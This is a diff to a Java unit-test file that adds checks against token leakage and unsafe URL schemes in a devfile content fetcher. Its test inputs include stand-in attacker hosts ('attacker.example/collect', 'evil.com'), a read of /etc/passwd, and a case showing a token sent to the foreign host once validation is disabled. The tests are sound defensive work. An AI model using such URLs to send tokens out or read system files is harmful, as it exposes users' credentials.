@@ -1,5 +1,5 @@
 /*
- * Copyright (c) 2012-2023 Red Hat, Inc.
+ * Copyright (c) 2012-2026 Red Hat, Inc.
  * This program and the accompanying materials are made
  * available under the terms of the Eclipse Public License 2.0
  * which is available at https://www.eclipse.org/legal/epl-2.0/
@@ -13,15 +13,22 @@ package org.eclipse.che.api.factory.server.scm;
 
 import static org.mockito.AdditionalAnswers.returnsFirstArg;
 import static org.mockito.ArgumentMatchers.anyString;
+import static org.mockito.ArgumentMatchers.eq;
+import static org.mockito.Mockito.lenient;
 import static org.mockito.Mockito.never;
 import static org.mockito.Mockito.verify;
 import static org.mockito.Mockito.when;
 import static org.testng.Assert.assertEquals;
+import static org.testng.Assert.assertTrue;
+import static org.testng.Assert.expectThrows;
 
 import org.eclipse.che.api.factory.server.urlfactory.RemoteFactoryUrl;
 import org.eclipse.che.api.workspace.server.devfile.URLFetcher;
+import org.eclipse.che.api.workspace.server.devfile.exception.DevfileException;
+import org.eclipse.che.commons.lang.UrlTargetValidator;
 import org.mockito.Mock;
 import org.mockito.testng.MockitoTestNGListener;
+import org.testng.annotations.AfterMethod;
 import org.testng.annotations.BeforeMethod;
 import org.testng.annotations.Listeners;
 import org.testng.annotations.Test;
@@ -40,7 +47,13 @@ public class AuthorizingFactoryParameterResolverTest {
     provider =
         new AuthorizingFileContentProvider<>(
             remoteFactoryUrl, urlFetcher, personalAccessTokenManager);
-    when(remoteFactoryUrl.rawFileLocation(anyString())).thenAnswer(returnsFirstArg());
+    // not reached by the tests that only exercise absolute URLs
+    lenient().when(remoteFactoryUrl.rawFileLocation(anyString())).thenAnswer(returnsFirstArg());
+  }
+
+  @AfterMethod
+  public void restoreUrlChecks() {
+    UrlTargetValidator.setCheckEnabled(null);
   }
 
   @Test
@@ -51,10 +64,28 @@ public class AuthorizingFactoryParameterResolverTest {
     when(personalAccessTokenManager.getAndStore(anyString())).thenReturn(personalAccessToken);
 
     // when
-    provider.fetchContent("url");
+    provider.fetchContent("https://provider.url/devfile.yaml");
 
     // then
     verify(personalAccessTokenManager).getAndStore(anyString());
+  }
+
+  @Test
+  public void shouldRejectAnAbsoluteUrlPointingToAForeignHost() throws Exception {
+    // given
+    when(remoteFactoryUrl.getProviderUrl()).thenReturn("https://provider.url");
+
+    // whene
+    DevfileException e =
+        expectThrows(
+            DevfileException.class,
+            () -> provider.fetchContent("https://attacker.example/collect"));
+
+    // then
+    assertTrue(e.getMessage().contains("absolute URLs must point to one of the provider origins"));
+    verify(personalAccessTokenManager, never()).getAndStore(anyString());
+    verify(urlFetcher, never()).fetch(anyString());
+    verify(urlFetcher, never()).fetch(anyString(), anyString());
   }
 
   @Test
@@ -77,5 +108,70 @@ public class AuthorizingFactoryParameterResolverTest {
   @Test
   public void shouldKeepResourceNameUnchanged() throws Exception {
     assertEquals(provider.formatUrl(".gitconfig"), ".gitconfig");
+  }
+
+  @Test(
+      expectedExceptions = DevfileException.class,
+      expectedExceptionsMessageRegExp = ".*only http and https schemes are permitted.*")
+  public void shouldRejectFileSchemeUrl() throws Exception {
+    provider.formatUrl("file:///etc/passwd");
+  }
+
+  @Test(
+      expectedExceptions = DevfileException.class,
+      expectedExceptionsMessageRegExp = ".*only http and https schemes are permitted.*")
+  public void shouldRejectFtpSchemeUrl() throws Exception {
+    provider.formatUrl("ftp://evil.com/secret");
+  }
+
+  @Test(
+      expectedExceptions = DevfileException.class,
+      expectedExceptionsMessageRegExp = ".*only http and https schemes are permitted.*")
+  public void shouldRejectJarSchemeUrl() throws Exception {
+    provider.formatUrl("jar:file:///tmp/evil.jar!/payload");
+  }
+
+  @Test
+  public void shouldStillResolveRelativePaths() throws Exception {
+    when(remoteFactoryUrl.rawFileLocation("devfile.yaml")).thenReturn("resolved-url");
+
+    String result = provider.formatUrl("devfile.yaml");
+
+    assertEquals(result, "resolved-url");
+  }
+
+  @Test
+  public void shouldStillResolveRelativePathsWithDotSlash() throws Exception {
+    when(remoteFactoryUrl.rawFileLocation("subdir/file.yaml")).thenReturn("resolved-subdir-url");
+
+    String result = provider.formatUrl("./subdir/file.yaml");
+
+    assertEquals(result, "resolved-subdir-url");
+  }
+
+  @Test
+  public void shouldAcceptAnyAbsoluteUrlWhenTheCheckIsTurnedOff() throws Exception {
+    // given
+    UrlTargetValidator.setCheckEnabled(false);
+
+    // then
+    assertEquals(
+        provider.formatUrl("https://attacker.example/collect"), "https://attacker.example/collect");
+    assertEquals(provider.formatUrl("file:///etc/passwd"), "file:///etc/passwd");
+  }
+
+  @Test
+  public void shouldSendTheTokenToAForeignHostWhenTheCheckIsTurnedOff() throws Exception {
+    // given
+    UrlTargetValidator.setCheckEnabled(false);
+    when(remoteFactoryUrl.getProviderUrl()).thenReturn("https://provider.url");
+    when(personalAccessTokenManager.getAndStore(anyString())).thenReturn(personalAccessToken);
+
+    // when
+    provider.fetchContent("https://attacker.example/collect");
+
+    // then
+    verify(personalAccessTokenManager).getAndStore(anyString());
+    verify(urlFetcher).fetch(eq("https://attacker.example/collect"), anyString());
   }
 }
